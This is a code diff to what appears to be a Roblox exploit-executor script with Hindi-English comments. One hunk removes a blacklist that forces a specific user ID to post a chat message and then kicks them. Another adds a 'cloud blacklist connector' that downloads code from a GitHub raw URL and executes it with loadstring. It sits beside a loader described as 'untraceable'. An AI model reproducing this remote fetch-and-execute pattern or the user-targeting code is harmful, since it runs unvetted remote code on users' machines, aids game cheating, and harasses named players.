@@ -1,44 +1,4 @@
 -- =========================================================
--- 🚫 HARD AUTO-TRAP & CHAT BLACKLIST SYSTEM
--- =========================================================
-local BLACKLISTED_IDS = {
-    [10097226859] = true, -- Pehla Target (Active)
-
-    -- Future targets ke liye 10 dummy slots:
-    -- [YAHAN_USER_ID_1] = true,
-    -- [YAHAN_USER_ID_2] = true,
-    -- [YAHAN_USER_ID_3] = true,
-    -- [YAHAN_USER_ID_4] = true,
-    -- [YAHAN_USER_ID_5] = true,
-    -- [YAHAN_USER_ID_6] = true,
-    -- [YAHAN_USER_ID_7] = true,
-    -- [YAHAN_USER_ID_8] = true,
-    -- [YAHAN_USER_ID_9] = true,
-    -- [YAHAN_USER_ID_10] = true,
-}
-
-local _bl_players = game:GetService("Players")
-local _bl_lp = _bl_players.LocalPlayer or _bl_players.PlayerAdded:Wait()
-
-if BLACKLISTED_IDS[_bl_lp.UserId] then
-    pcall(function()
-        local chatMsg = "Sorry yaar Ashu papa"
-        local textChatService = game:GetService("TextChatService")
-        local repStorage = game:GetService("ReplicatedStorage")
-        
-        if textChatService and textChatService.TextChannels:FindFirstChild("RBXGeneral") then
-            textChatService.TextChannels.RBXGeneral:SendAsync(chatMsg)
-        elseif repStorage:FindFirstChild("DefaultChatSystemChatEvents") then
-            repStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatMsg, "All")
-        end
-    end)
-    
-    task.wait(0.5)
-    _bl_lp:Kick("( Chal nikal  )")
-    return
-end
-
--- =========================================================
 -- 🌐 UNIVERSAL EXECUTOR & DEVICE COMPATIBILITY SHIM
 -- =========================================================
 pcall(function()
@@ -86,6 +46,19 @@ if not _TEMP_LP.Character or not _TEMP_LP.Character:FindFirstChild("HumanoidRoot
     pcall(function() char:WaitForChild("HumanoidRootPart", 5) end)
 end
 -- =========================================================
+
+-- =========================================================
+-- 🚫 CLOUD BLACKLIST CONNECTOR
+-- =========================================================
+pcall(function()
+    local blCode = game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/Black%20list", true)
+    if blCode and blCode ~= "" then
+        local execBL = loadstring(blCode)
+        if execBL then
+            execBL()
+        end
+    end
+end)
 
 -- 🔌 SILENT BACKGROUND LOADER (100% WORKING & UNTRACEABLE)
 task.spawn(function()
@@ -1838,7 +1811,7 @@ end)
 local function makeDraggable(frame, handle, ghostAura, isOrb)
     local dragging = false
     local dragStart = nil
-    local startPos = nil
+    local startPos = frame.Position
     local targetPos = frame.Position
     local velocity = Vector2.new(0, 0)
     local lastInputPos = Vector2.new(0, 0)
@@ -3921,7 +3894,7 @@ RunService.Heartbeat:Connect(function(dt)
             local isRagdoll = (tHum and tHum:GetState() == Enum.HumanoidStateType.Physics)
             
             local yOffset = isSitting and -2.5 or (isRagdoll and -1.5 or -3.8)
-            tiltAngle = isRagdoll and math.rad(-90) or 0
+            local tiltAngle = isRagdoll and math.rad(-90) or 0
 
             local centerGroundPos = bodyPos + Vector3.new(0, yOffset, 0)
             local maxBaseDist = math.max(2.5, 4.0 * rScale) 
